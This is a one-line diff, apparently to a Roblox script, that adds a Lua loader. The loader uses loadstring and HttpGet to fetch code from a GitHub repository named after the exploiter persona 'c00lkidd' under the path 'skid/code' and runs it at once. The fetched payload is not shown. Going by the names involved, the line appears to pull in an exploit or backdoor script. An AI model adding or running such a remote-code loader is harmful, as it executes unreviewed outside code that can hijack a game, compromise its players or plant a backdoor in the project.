@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/c00lkiddpostshaxxs/c00lkidd/main/skid/code"))()
